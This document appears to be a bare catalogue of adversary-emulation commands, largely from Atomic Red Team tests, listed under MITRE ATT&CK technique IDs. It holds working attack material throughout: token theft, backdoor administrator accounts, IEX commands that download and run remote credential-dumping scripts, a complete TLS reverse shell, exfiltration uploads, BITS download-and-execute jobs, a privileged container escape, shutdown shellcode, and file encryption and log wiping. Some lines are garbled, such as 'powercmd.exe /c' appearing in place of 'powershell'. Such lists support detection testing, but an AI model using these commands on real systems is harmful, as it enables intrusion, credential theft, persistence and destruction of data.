## T1548: Abuse Elevation Control Mechanism
## T1134: Access Token Manipulation
* Token Stealing:
use incognito
list_tokens -u
impersonate_token DOMAIN\\User
or:
steal_token {pid}
* Token Stealing:
steal_token pid#
* powercmd.exe /c/credentials/tokens
* powercmd.exe /c/management/runas
* powercmd.exe /c/privesc/getsystem
## T1531: Account Access Removal
* $PWord = ConvertTo-SecureString -String password -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
if((Get-ADUser #{remove_user} -Properties memberof).memberof -like "CN=Domain Admins*"){
  Remove-ADGroupMember -Identity "Domain Admins" -Members #{remove_user} -Credential $Credential -Confirm:$False
} else{
    write-host "Error - Make sure #{remove_user} is in the domain admins group" -foregroundcolor Red
}
* $PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList domain\super_user, $PWord
if((Get-ADUser #{remove_user} -Properties memberof).memberof -like "CN=Domain Admins*"){
  Remove-ADGroupMember -Identity "Domain Admins" -Members #{remove_user} -Credential $Credential -Confirm:$False
} else{
    write-host "Error - Make sure #{remove_user} is in the domain admins group" -foregroundcolor Red
}
* $PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
if((Get-ADUser remove_user -Properties memberof).memberof -like "CN=Domain Admins*"){
  Remove-ADGroupMember -Identity "Domain Admins" -Members remove_user -Credential $Credential -Confirm:$False
} else{
    write-host "Error - Make sure remove_user is in the domain admins group" -foregroundcolor Red
}
* net user AtomicAdministrator #{new_user_password} /add
net.exe user AtomicAdministrator #{new_password}
* net user #{user_account} User2ChangePW! /add
net.exe user #{user_account} #{new_password}
* net user AtomicUser #{new_user_password} /add
net.exe user AtomicUser /delete
* net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} HuHuHUHoHo283283@dJD
* net user #{user_account} User2DeletePW! /add
net.exe user #{user_account} /delete
## T1087: Account Discovery
* net user [username] [/domain]
* cmd.exe /c net user [username] [/domain]
* dsquery group "ou=Domain Admins,dc=domain,dc=com"
dsquery user "dc=domain,dc=com"
dsquery * OU="Domain Admins",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description
dsquery * -filter "(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))" -Attr samAccountName mail -Limit 0
dsquery * -filter "(&(objectCategory=group)(name=*Admin*))" -Attr name description members
* cmd.exe /c dsquery group "out=Domain Admins",dc=domain,dc=com"
cmd.exe /c dsquery user "dc=domain,dc=com"
cmd.exe /c dsquery * OU="Domain Admins",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description
cmd.exe /c dsquery * -filter "(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))" -Attr samAccountName mail -Limit 0
cmd.exe /c dsquery * -filter "(&(objectCategory=group)(name=*Admin*))" -Attr name description members
* Net.exe localgroup "administrators"
* Net.exe group "domain admins" /domain
* Net.exe user * /domain
* wmic.exe useraccount get /ALL
* wmic.exe useraccount list
* wmic.exe qfe get description,installedOn /format:csv
* wmic.exe process get caption,executablepath,commandline
* wmic.exe service get name,displayname,pathname,startmode
* wmic.exe share list
* wmic.exe /node:"192.168.0.1" service where (caption like "%sql server (%")
* wmic.exe get-wmiobject -class "win32_share" -namespace "root\CIMV2" -computer "targetname"
* nltest.exe
* powercmd.exe /c/management/get_domain_sid
* powercmd.exe /c/management/sid_to_user
* powercmd.exe /c/management/user_to_sid
* Atomic Test #4 - Show if a user account has ever logger in remotely
* lastlog > #{output_file}
* id
* groups
* cat /etc/passwd > #{output_file}
* Atomic Test #1 - Enumerate all accounts
* lsof $USER
* Atomic Test #5 - Enumerate users and groups
* username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username
* Atomic Test #3 - View accounts with UID 0
## T1098: Account Manipulation
* $x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "#{account_prefix}-$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember "Domain Admins" $account
* $x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "#{account_prefix}-$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False 
Add-ADGroupMember "1010" $account
* $x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        $account = $member.Name -replace ".+\\\","" # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
        Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
        }
    }
* aws iam create-group --group-name atomicredteam
aws iam add-user-to-group --user-name atomicredteam --group-name atomicredteam
* $x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "atr--$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember "1010" $account
* powercmd.exe /c/management/honeyhash
## T1583: Acquire Infrastructure
## T1595: Active Scanning
## T1557: Adversary-in-the-Middle
## T1071: Application Layer Protocol
## T1010: Application Window Discovery
* C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe #{input_source_code}
%TEMP%\T1010.exe
* $x = Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object MainWindowTitle;
$a = New-Object -com "Shell.Application"; $b = $a.windows() | select-object LocationName;
write-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)
## T1560: Archive Collected Data
* dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip
* dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath #{output_file}
## T1123: Audio Capture
* powercmd.exe /c.exe -Command WindowsAudioDevice-Powercmd.exe /c-Cmdlet
* python/collection/osx/osx_mic_record
## T1119: Automated Collection
* sc query type=service > %TEMP%\T1119_1.txt
doskey /history > %TEMP%\T1119_2.txt
wmic process list > %TEMP%\T1119_3.txt
tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
* Get-Service > $env:TEMP\T1119_1.txt
Get-ChildItem Env: > $env:TEMP\T1119_2.txt
Get-Process > $env:TEMP\T1119_3.txt
* mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
dir c: /b /s .docx | findstr /e .docx
for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection
* New-Item -Path $env:TEMP\T1119_powercmd.exe /c_collection -ItemType Directory -Force | Out-Null
Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powercmd.exe /c_collection}
* cmd.exe dir c: /b /s .docx | findstr /e .docx
## T1020: Automated Exfiltration
* $fileName = "#{file}"
$url = "https://google.com"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
* $fileName = "C:\temp\T1020_exfilFile.txt"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
* powercmd.exe /c/exfiltration/egresscheck
## T1197: BITS Jobs
* Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination $env:TEMP\bitsadmin2_flag.ps1
* bitsadmin.exe /create AtomicBITS
bitsadmin.exe /addfile AtomicBITS #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} NULL
bitsadmin.exe /resume AtomicBITS
timeout 5
bitsadmin.exe /complete AtomicBITS
* set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
* Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}
* set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
* bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}
* bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}
* bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} %temp%\bitsadmin1_flag.ps1
* bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} C:\Windows\system32\notepad.exe NULL
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}
* bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\bitsadmin3_flag.ps1
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}
* set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
* bitsadmin.exe
## T1547: Boot or Logon Autostart Execution
## T1037: Boot or Logon Initialization Scripts
* \Environment\UserInitMprLogonScript
* python/persistence/multi/desktopfile
* python/persistence/osx/loginhook
## T1217: Browser Bookmark Discovery
* where /R C:\Users\ Bookmarks
* find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> /tmp/T1217-Chrome.txt \;
cat /tmp/T1217-Chrome.txt 2>/dev/null
* find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> /tmp/T1217_Firefox.txt \;
cat /tmp/T1217_Firefox.txt 2>/dev/null
* dir /s /b %USERPROFILE%\Favorites
* find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \;
cat /tmp/T1217-Firefox.txt 2>/dev/null
* where /R C:\Users\ places.sqlite
* Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force
* cat ~/Library/Application\ Support/Google/Chrome/Default/Bookmarks
* powercmd.exe /c/collection/browser_data
## T1176: Browser Extensions
## T1185: Browser Session Hijacking
## T1110: Brute Force
* powercmd.exe /c/recon/get_sql_server_login_default_pw
* powercmd.exe /c/recon/http_login
## T1612: Build Image on Host
## T1115: Clipboard Data
* echo Get-Process | clip
Get-Clipboard | iex
* echo ifconfig | pbcopy
$(pbpaste)
* dir | clip
echo "T1115" > %temp%\T1115.txt
clip < %temp%\T1115.txt
* Get-Clipboard -raw
* pbpaste
* xclip -o
* cmd.exe <command> | clip
* cmd.exe clip < readme.txt
* powercmd.exe /c.exe echo Get-Process | clip
* powercmd.exe /c.exe echo Get-Process | clip
* powercmd.exe /c/collection/clipboard_monitor
* python/collection/osx/clipboard
## T1580: Cloud Infrastructure Discovery
## T1538: Cloud Service Dashboard
## T1526: Cloud Service Discovery
## T1619: Cloud Storage Object Discovery
## T1059: Command and Scripting Interpreter
* \\Windows\\.+\\cmd.exe
* cmd.exe|/c
* powercmd.exe /c/lateral_movement/invoke_sqloscmd
* powercmd.exe /c/management/spawnas
## T1043: Commonly Used Port
## T1092: Communication Through Removable Media
## T1175: Component Object Model and Distributed COM
## T1586: Compromise Accounts
## T1554: Compromise Client Software Binary
## T1584: Compromise Infrastructure
## T1609: Container Administration Command
* kubectl create -f src/busybox.yaml -n #{namespace}
kubectl exec -n #{namespace} busybox -- uname
* kubectl create -f src/busybox.yaml -n default
kubectl exec -n default busybox -- #{command}
## T1613: Container and Resource Discovery
## T1136: Create Account
* Add backdoor user account:
net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
* Add backdoor user account:
cmd.exe /c net user support_388945a0 somepasswordhere /add /y
cmd.exe /c net localgroup administrators support_388945a0 /add
cmd.exe /c net localgroup "remote desktop users" support_388945a0 /add
* Enable backdoor user account:
net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
* Enable backdoor user account:
cmd.exe /c net user support_388945a0 /active:yes
cmd.exe /c net localgroup administrators support_388945a0 /add
cmd.exe /c net localgroup "remote desktop users" support_388945a0 /add
* Net.exe user /add
* Net.exe localgroup administrators * /add
* Net.exe user * \password \domain
* Net.exe dsadd user
* powercmd.exe /c/persistence/misc/add_netuser
* powercmd.exe /c/privesc/powerup/service_useradd
* useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
* useradd -M -N -r -s /bin/bash -c "#{comment}" #{username}
## T1543: Create or Modify System Process
## T1555: Credentials from Password Stores
* IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
* vaultcmd /listcreds:"Windows Credentials" /all
* IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
* vaultcmd /listcreds:"Web Credentials" /all
## T1485: Data Destruction
* if (-not (Test-Path #{file_to_delete})) { New-Item #{file_to_delete} -Force }
Invoke-Expression -Command "$env:TEMP\Sdelete\sdelete.exe -accepteula #{file_to_delete}"
* if (-not (Test-Path $env:TEMP\T1485.txt)) { New-Item $env:TEMP\T1485.txt -Force }
Invoke-Expression -Command "#{sdelete_exe} -accepteula $env:TEMP\T1485.txt"
* dd of=#{file_to_overwrite} if=/dev/zero
* dd of=/var/log/syslog if=#{overwrite_source}
## T1132: Data Encoding
## T1486: Data Encrypted for Impact
* $which_7z a -p#{pwd_for_encrypted_file} /tmp/passwd.zip #{input_file_path}
* echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
* $which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} /etc/passwd
* if [[ $USER == "root" ]]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
* $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
$which_openssl rsa -in #{private_key_path} -pubout -out /tmp/pub.pem
$which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in #{input_file_path} -out #{encrypted_file_path}
* $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in /etc/passwd -out #{encrypted_file_path}
* echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o #{encrypted_file_path} -c #{input_file_path}
* echo "passwd" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
* $which_openssl genrsa -out /tmp/key.pem #{encryption_bit_size}
$which_openssl rsa -in /tmp/key.pem -pubout -out #{public_key_path}
$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
* echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o /tmp/passwd.gpg -c #{input_file_path}
* if [[ $USER == "root" ]]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt ~/.bash_history; file ~/.bash_history.cpt; #{impact_command}; fi
* $which_7z a -ppasswd #{encrypted_file_path} #{input_file_path}
* if [[ $USER == "root" ]]; then $which_ccencrypt /etc/passwd; file /etc/passwd.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
* $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out /tmp/passwd.zip
* echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c /etc/passwd
## T1565: Data Manipulation
## T1001: Data Obfuscation
## T1074: Data Staged
## T1030: Data Transfer Size Limits
* cd /tmp/T1030; split -b 5000000 #{file_name}
ls -l /tmp/T1030
* cd #{folder_path}; split -b 5000000 T1030_urandom
ls -l #{folder_path}
## T1530: Data from Cloud Storage Object
## T1602: Data from Configuration Repository
## T1213: Data from Information Repositories
## T1005: Data from Local System
* pip install -q stormssh 2> /dev/null && storm list | sed 's/\x1b\[[0-9;]*m//g'
* pip install stormssh && storm list
* find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o "\b[A-Za-z0-9._%+-]+@#{target.org.name}\b" 2>/dev/null {} \;
* curl #{remote.host.socket}
* find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
* find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
* Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
exit 0;
* find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o "(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" 2>/dev/null {} \;
* powercmd.exe /c/collection/get_sql_column_sample_data
* powercmd.exe /c/collection/get_sql_query
* powercmd.exe /c/collection/minidump
* powercmd.exe /c/credentials/sessiongopher
* python/collection/osx/browser_dump
* python/collection/osx/imessage_dump
## T1039: Data from Network Shared Drive
## T1025: Data from Removable Media
## T1491: Defacement
* Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'
* echo "proof that this machine was hacked." > message.txt
* .\Invoke-MemeKatz.ps1
* powercmd.exe /c.exe -ep bypass -c "Invoke-MemeKatz.ps1"
## T1140: Deobfuscate/Decode Files or Information
* ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("Hello from Atomic Red Team test T1140!".encode());print(enc.decode())')
python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
echo $ENCODED > #{encoded_file} && python3 -c "import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())"
* ENCODED=$(echo '#{message}' | xxd -ps -c 256)
printf $ENCODED | xxd -r -p
echo $ENCODED | xxd -r -p
echo $(echo $ENCODED) | xxd -r -p
echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded
echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded
echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p
echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p
* certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
* ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("#{message}".encode());print(enc.decode())')
python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
echo $ENCODED > /tmp/T1140.encoded && python3 -c "import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())"
* ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));")
perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,"<","#{encoded_file}");print(decode_base64(<$f>));'
* ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('#{message}'));")
perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,"<","/tmp/T1140.encoded");print(decode_base64(<$f>));'
* ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)
printf $ENCODED | xxd -r -p
echo $ENCODED | xxd -r -p
echo $(echo $ENCODED) | xxd -r -p
echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}
echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
* copy %windir%\system32\certutil.exe %temp%\tcm.tmp
%temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt
%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
* ENCODED=$(echo '#{message}' | base64)
printf $ENCODED | base64 -d
echo $ENCODED | base64 -d
echo $(echo $ENCODED) | base64 -d
echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded
echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded
echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d
echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d
bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
* ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)
printf $ENCODED | base64 -d
echo $ENCODED | base64 -d
echo $(echo $ENCODED) | base64 -d
echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}
echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d
bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
* certutil.exe -decode
* certutil.exe-decode|-urlcache
* certutil.exe|-decode|-urlcache
## T1610: Deploy Container
* kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
## T1587: Develop Capabilities
## T1006: Direct Volume Access
* $buffer = New-Object byte[] 11
$handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'
$handle.Read($buffer, 0, $buffer.Length)
$handle.Close()
Format-Hex -InputObject $buffer
## T1561: Disk Wipe
## T1484: Domain Policy Modification
## T1482: Domain Trust Discovery
* dsquery * -filter "(objectClass=trustedDomain)" -attr *
* [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
* [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
* nltest /domain_trusts
* Import-Module "$env:TEMP\PowerView.ps1"
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
* Import-Module .\powerview.ps1 -Force;
Get-NetDomain | ConvertTo-Json -Depth 1
## T1189: Drive-by Compromise
## T1568: Dynamic Resolution
## T1114: Email Collection
* powercmd.exe /c/management/mailraider/disable_security
* powercmd.exe /c/management/mailraider/get_emailitems
* powercmd.exe /c/management/mailraider/get_subfolders
* powercmd.exe /c/management/mailraider/mail_search
* powercmd.exe /c/management/mailraider/search_gal
* powercmd.exe /c/management/mailraider/send_mail
* powercmd.exe /c/management/mailraider/view_email
* python/collection/osx/search_email
## T1573: Encrypted Channel
* $server_ip = #{server_ip}
$server_port = 443
$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '443')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
* $server_ip = 127.0.0.1
$server_port = #{server_port}
$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '#{server_port}')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
## T1499: Endpoint Denial of Service
* 0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
* .\wifi.ps1 -Off
* ./wifi.sh off
## T1611: Escape to Host
* kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
## T1585: Establish Accounts
## T1546: Event Triggered Execution
## T1480: Execution Guardrails
## T1048: Exfiltration Over Alternative Protocol
* Import-Module #{ps_module}
Invoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p atomic -doh #{doh} -t #{time} #{encoding}
